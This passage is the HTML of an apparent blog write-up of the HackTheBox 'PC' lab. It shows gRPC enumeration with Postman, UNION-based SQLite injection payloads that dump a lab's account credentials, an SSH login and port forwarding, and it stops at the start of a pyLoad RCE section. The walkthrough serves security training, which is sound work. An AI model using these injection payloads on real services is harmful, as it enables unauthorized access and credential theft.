@@ -1,0 +1,1102 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="PC is an easy difficulty box with only an exposed gRPC API. After finding a way to interact with the service, we can find a very basic SQL injection vulnerability that allows us to leak login credentials. Once logged in via SSH, we find an internal port running the web application pyLoad. The pyLoad version is vulnerable to unauthenticated RCE, which we can use to execute actions as root.">
+<title>HackTheBox - PC</title>
+
+<link rel='canonical' href='http://localhost:1313/p/hackthebox-pc/'>
+
+<link rel="stylesheet" href="/scss/style.min.663803bebe609202d5b39d848f2d7c2dc8b598a2d879efa079fa88893d29c49c.css"><meta property='og:title' content="HackTheBox - PC">
+<meta property='og:description' content="PC is an easy difficulty box with only an exposed gRPC API. After finding a way to interact with the service, we can find a very basic SQL injection vulnerability that allows us to leak login credentials. Once logged in via SSH, we find an internal port running the web application pyLoad. The pyLoad version is vulnerable to unauthenticated RCE, which we can use to execute actions as root.">
+<meta property='og:url' content='http://localhost:1313/p/hackthebox-pc/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='gRPC' /><meta property='article:tag' content='Postman' /><meta property='article:tag' content='SQLite' /><meta property='article:tag' content='SQL Injection' /><meta property='article:tag' content='pyLoad' /><meta property='article:tag' content='CSRF' /><meta property='article:published_time' content='2023-10-07T10:18:48-05:00'/><meta property='article:modified_time' content='2023-10-07T10:18:48-05:00'/><meta property='og:image' content='http://localhost:1313/p/hackthebox-pc/PC.png' />
+<meta name="twitter:title" content="HackTheBox - PC">
+<meta name="twitter:description" content="PC is an easy difficulty box with only an exposed gRPC API. After finding a way to interact with the service, we can find a very basic SQL injection vulnerability that allows us to leak login credentials. Once logged in via SSH, we find an internal port running the web application pyLoad. The pyLoad version is vulnerable to unauthenticated RCE, which we can use to execute actions as root."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='http://localhost:1313/p/hackthebox-pc/PC.png' />
+    <link rel="shortcut icon" href="/favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu897059592634026878.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">Lorem ipsum dolor sit amet, consectetur adipiscing elit.</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/CaiJimmy/hugo-theme-stack'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#enumeration">Enumeration</a>
+      <ol>
+        <li><a href="#interacting-with-grpc-via-postman">Interacting with gRPC via Postman</a></li>
+        <li><a href="#sql-injection-in-getinfo-function">SQL Injection in getInfo function</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#internal-web-server-pyload">Internal web server pyLoad</a></li>
+        <li><a href="#rce-as-root-from-pyload-vulnerability-cve-2023-0297">RCE as root from pyLoad vulnerability (CVE-2023-0297)</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/hackthebox-pc/">
+                <img src="/p/hackthebox-pc/PC_hu13568507019593117128.png"
+                        srcset="/p/hackthebox-pc/PC_hu13568507019593117128.png 800w, /p/hackthebox-pc/PC_hu9590476779441467652.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - PC" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack the Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/hackthebox-pc/">HackTheBox - PC</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            PC is an easy difficulty box with only an exposed gRPC API. After finding a way to interact with the service, we can find a very basic SQL injection vulnerability that allows us to leak login credentials. Once logged in via SSH, we find an internal port running the web application pyLoad. The pyLoad version is vulnerable to unauthenticated RCE, which we can use to execute actions as root.
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 07, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    6 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration
+</h2><p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Nmap scan report for 10.10.11.214
+</span></span><span class="line"><span class="cl">Host is up (0.047s latency).
+</span></span><span class="line"><span class="cl">Not shown: 65533 filtered tcp ports (no-response)
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+</span></span><span class="line"><span class="cl">| ssh-hostkey: 
+</span></span><span class="line"><span class="cl">|   3072 91:bf:44:ed:ea:1e:32:24:30:1f:53:2c:ea:71:e5:ef (RSA)
+</span></span><span class="line"><span class="cl">|   256 84:86:a6:e2:04:ab:df:f7:1d:45:6c:cf:39:58:09:de (ECDSA)
+</span></span><span class="line"><span class="cl">|_  256 1a:a8:95:72:51:5e:8e:3c:f1:80:f5:42:fd:0a:28:1c (ED25519)
+</span></span><span class="line"><span class="cl">50051/tcp open  unknown
+</span></span><span class="line"><span class="cl">1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap done: 1 IP address (1 host up) scanned in 205.03 seconds
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is very little information right out the gate, only a port that nmap fails to identify. However, quick google searching shows that this port is used in <a class="link" href="https://xrpl.org/configure-grpc.html"  target="_blank" rel="noopener"
+    >gRPC API</a>. Interacting with it requires a specific protocol, so we need to use a tailored program.
+While I initially started enumeration with grpc_cli and <a class="link" href="https://medium.com/@at_ishikawa/use-grpc-cli-to-request-a-grpc-server-37219b33c94b"  target="_blank" rel="noopener"
+    >this resource</a>, I had a lot of trouble passing a login token and switched to <a class="link" href="https://www.postman.com/"  target="_blank" rel="noopener"
+    >Postman API</a>. As such, I will cover only using Postman from the beginning.</p>
+<h3 id="interacting-with-grpc-via-postman">Interacting with gRPC via Postman
+</h3><p>To use, simply extract the tarball and run <code>Postman</code> binary:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/pc]
+</span></span><span class="line"><span class="cl">└─$ tar -xvf postman-linux-x64.tar.gz 
+</span></span><span class="line"><span class="cl">Postman/
+</span></span><span class="line"><span class="cl">Postman/app/
+</span></span><span class="line"><span class="cl">Postman/app/icons/
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">Postman/app/locales/ru.pak
+</span></span><span class="line"><span class="cl">Postman/Postman
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/pc]
+</span></span><span class="line"><span class="cl">└─$ cd Postman 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/pc/Postman]
+</span></span><span class="line"><span class="cl">└─$ ls
+</span></span><span class="line"><span class="cl">app  Postman
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/pc/Postman]
+</span></span><span class="line"><span class="cl">└─$ ./Postman               
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The GUI will open up, and we can create an account or skip for now:
+<img src="/p/hackthebox-pc/Images/PostLaunch.png"
+	width="1283"
+	height="605"
+	srcset="/p/hackthebox-pc/Images/PostLaunch_hu17725599815013746604.png 480w, /p/hackthebox-pc/Images/PostLaunch_hu17702051801532864210.png 1024w"
+	loading="lazy"
+	
+		alt="Skipping Postman Registration"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="508px"
+	
+>
+We can set up our request first by selecting gRPC:
+<img src="/p/hackthebox-pc/Images/setgrpc.png"
+	width="1229"
+	height="458"
+	srcset="/p/hackthebox-pc/Images/setgrpc_hu14976013228948782201.png 480w, /p/hackthebox-pc/Images/setgrpc_hu1444287229680442069.png 1024w"
+	loading="lazy"
+	
+		alt="Selecting gRPC request type"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="268"
+		data-flex-basis="644px"
+	
+>
+Now when we supply the URL, API methods will be loaded automatically thanks to server reflection query:
+<img src="/p/hackthebox-pc/Images/servicereflection.png"
+	width="898"
+	height="422"
+	srcset="/p/hackthebox-pc/Images/servicereflection_hu2934358200560003693.png 480w, /p/hackthebox-pc/Images/servicereflection_hu12958003457715558609.png 1024w"
+	loading="lazy"
+	
+		alt="Viewing SimpleApps functions"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+>
+First, we can try to register a user. Once again, the query is made easy with Postman&rsquo;s &ldquo;use example message&rdquo; feature. It will create for us a structured JSON message with all necessary parameters. For my account, I edited the example to have a username/password of <code>asdf</code>.
+<img src="/p/hackthebox-pc/Images/register.png"
+	width="899"
+	height="628"
+	srcset="/p/hackthebox-pc/Images/register_hu4114810367632773162.png 480w, /p/hackthebox-pc/Images/register_hu17130731597053543787.png 1024w"
+	loading="lazy"
+	
+		alt="Registering asdf"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="143"
+		data-flex-basis="343px"
+	
+>
+Next, we can log in. The server responds with giving us an id number. Notice also, the Trailers tab. This will contain our login token, which we must supply for logged-in activities.
+<img src="/p/hackthebox-pc/Images/login1.png"
+	width="874"
+	height="560"
+	srcset="/p/hackthebox-pc/Images/login1_hu17949063264710045746.png 480w, /p/hackthebox-pc/Images/login1_hu13189318402216274233.png 1024w"
+	loading="lazy"
+	
+		alt="Logging in as asdf"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="156"
+		data-flex-basis="374px"
+	
+>
+Selecting the Trailers tab we can view:
+<img src="/p/hackthebox-pc/Images/login2.png"
+	width="897"
+	height="184"
+	srcset="/p/hackthebox-pc/Images/login2_hu2539733810690001311.png 480w, /p/hackthebox-pc/Images/login2_hu11290596841518573609.png 1024w"
+	loading="lazy"
+	
+		alt="Viewing login token"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="487"
+		data-flex-basis="1170px"
+	
+>
+To use this token, we can go to the Metadata tab, and add the key as &rsquo;token&rsquo; and the value the copied value from Trailers, omitting the b&rsquo;&rsquo;.
+<img src="/p/hackthebox-pc/Images/login3.png"
+	width="894"
+	height="307"
+	srcset="/p/hackthebox-pc/Images/login3_hu9567145984449782366.png 480w, /p/hackthebox-pc/Images/login3_hu7093317300196708687.png 1024w"
+	loading="lazy"
+	
+		alt="Adding login token to Metadata"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="698px"
+	
+>
+Finally, we can use the getInfo function. &ldquo;Use Example Message&rdquo; will again auto-suggest a valid JSON request, that we can use to supply our own id value:
+<img src="/p/hackthebox-pc/Images/getinfo1.png"
+	width="870"
+	height="540"
+	srcset="/p/hackthebox-pc/Images/getinfo1_hu1956050798097663064.png 480w, /p/hackthebox-pc/Images/getinfo1_hu2208387408921270360.png 1024w"
+	loading="lazy"
+	
+		alt="Checking our number"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="161"
+		data-flex-basis="386px"
+	
+></p>
+<h3 id="sql-injection-in-getinfo-function">SQL Injection in getInfo function
+</h3><p>After trying several things, we might learn that this API is vulnerable to SQL injection. In the below example, I use UNION injection to insert the number &lsquo;1&rsquo; in the response:
+<img src="/p/hackthebox-pc/Images/union1.png"
+	width="876"
+	height="549"
+	srcset="/p/hackthebox-pc/Images/union1_hu1963647622275191660.png 480w, /p/hackthebox-pc/Images/union1_hu8502230647594623502.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT 1 -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="159"
+		data-flex-basis="382px"
+	
+>
+First, we can determine the database type by enumerating versions. This way, I find that the service is using sqlite:
+<img src="/p/hackthebox-pc/Images/union2.png"
+	width="897"
+	height="539"
+	srcset="/p/hackthebox-pc/Images/union2_hu15771540082096904161.png 480w, /p/hackthebox-pc/Images/union2_hu9281464872257702133.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT sqlite_version(); -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+>
+Using a query from <a class="link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md"  target="_blank" rel="noopener"
+    >PayloadAllTheThings</a>, I am able to dump databases. We are likely already seeing <code>messages</code>, and <code>accounts</code> will have interesting information.
+<img src="/p/hackthebox-pc/Images/union3.png"
+	width="906"
+	height="544"
+	srcset="/p/hackthebox-pc/Images/union3_hu7455429271894537950.png 480w, /p/hackthebox-pc/Images/union3_hu9692726118543484644.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=table and tbl_name NOT like sqlite_% -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="166"
+		data-flex-basis="399px"
+	
+>
+Next, enumerating the columns in table <code>accounts</code>:
+<img src="/p/hackthebox-pc/Images/union4.png"
+	width="894"
+	height="524"
+	srcset="/p/hackthebox-pc/Images/union4_hu17475523458385347992.png 480w, /p/hackthebox-pc/Images/union4_hu9764544042627140734.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT sql FROM sqlite_master WHERE type!=meta AND sql NOT NULL AND name =accounts -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="409px"
+	
+>
+Seeing <code>\n\t</code> simply refers to a newline, followed by tab indentation. There are 2 column entries, <code>username</code> and <code>password</code>. First, finding <code>password</code>:
+<img src="/p/hackthebox-pc/Images/union5.png"
+	width="889"
+	height="529"
+	srcset="/p/hackthebox-pc/Images/union5_hu18056286897693069536.png 480w, /p/hackthebox-pc/Images/union5_hu12679393788293283959.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT password FROM accounts -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="403px"
+	
+>
+Now with a password, we can find a matching username:
+<img src="/p/hackthebox-pc/Images/union6.png"
+	width="892"
+	height="529"
+	srcset="/p/hackthebox-pc/Images/union6_hu13472046415986624067.png 480w, /p/hackthebox-pc/Images/union6_hu14326665945629783211.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT username FROM accounts -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="168"
+		data-flex-basis="404px"
+	
+>
+Although we have a username, this does not really seem like a password that a user &lsquo;admin&rsquo; would have. With my current injection, I am just retrieving the first entry in the <code>username</code> field. However, we can be extra sure to match the username &amp; password by using WHERE:
+<img src="/p/hackthebox-pc/Images/union7.png"
+	width="881"
+	height="518"
+	srcset="/p/hackthebox-pc/Images/union7_hu1732276450885305889.png 480w, /p/hackthebox-pc/Images/union7_hu13461539490516816459.png 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT username FROM accounts WHERE password=HereIsYourPassword1431 -"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="170"
+		data-flex-basis="408px"
+	
+>
+Finally, we have a credential pair of <code>sau:HereIsYourPassWord1431</code>. Fortunately, this is enough to gain entry into the system. We are able to use ssh:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">┌──<span class="o">(</span>kali㉿kali<span class="o">)</span>-<span class="o">[</span>~/Documents/Academy/sysmon<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ ssh sau@10.10.11.214      
+</span></span><span class="line"><span class="cl">&lt;...SNIP..&gt;
+</span></span><span class="line"><span class="cl">sau@pc:~$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>sau<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>sau<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>sau<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="privilege-escalation">Privilege Escalation
+</h2><h3 id="internal-web-server-pyload">Internal web server pyLoad
+</h3><p>Enumerating open ports, we find an internal port not available to us earlier:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sau@pc:~$ netstat -ntlp
+</span></span><span class="line"><span class="cl"><span class="o">(</span>Not all processes could be identified, non-owned process info
+</span></span><span class="line"><span class="cl"> will not be shown, you would have to be root to see it all.<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::50051                :::*                    LISTEN      -                   
+</span></span><span class="line"><span class="cl">tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN      -                   
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Port 8000 is common for web applications. We can do a very fast and easy check with a <code>curl</code> request:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sau@pc:~$ curl localhost:8000
+</span></span><span class="line"><span class="cl">&lt;!doctype html&gt;
+</span></span><span class="line"><span class="cl">&lt;html <span class="nv">lang</span><span class="o">=</span>en&gt;
+</span></span><span class="line"><span class="cl">&lt;title&gt;Redirecting...&lt;/title&gt;
+</span></span><span class="line"><span class="cl">&lt;h1&gt;Redirecting...&lt;/h1&gt;
+</span></span><span class="line"><span class="cl">&lt;p&gt;You should be redirected automatically to the target URL: &lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">&#34;/login?next=http%3A%2F%2Flocalhost%3A8000%2F&#34;</span>&gt;/login?next<span class="o">=</span>http%3A%2F%2Flocalhost%3A8000%2F&lt;/a&gt;. If not, click the link.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>There is a webpage here, and we can see already that there is login involved. In order to get a better view, we can utilize ssh port forwarding:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ ssh -L 8000:localhost:8000 sau@10.10.11.214
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now when we visit <code>localhost:8000</code> in our browser, we can see the web login page:
+<img src="/p/hackthebox-pc/Images/20230520223533.png"
+	width="640"
+	height="368"
+	srcset="/p/hackthebox-pc/Images/20230520223533_hu15142488741382281877.png 480w, /p/hackthebox-pc/Images/20230520223533_hu9364609495780974792.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="173"
+		data-flex-basis="417px"
+	
+>
+A few basic credential attempts did not work.</p>
+<h3 id="rce-as-root-from-pyload-vulnerability-cve-2023-0297">RCE as root from pyLoad vulnerability (CVE-2023-0297)
+</h3><p>Searching a little more, I find <a class="link" href="https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/"  target="_blank" rel="noopener"
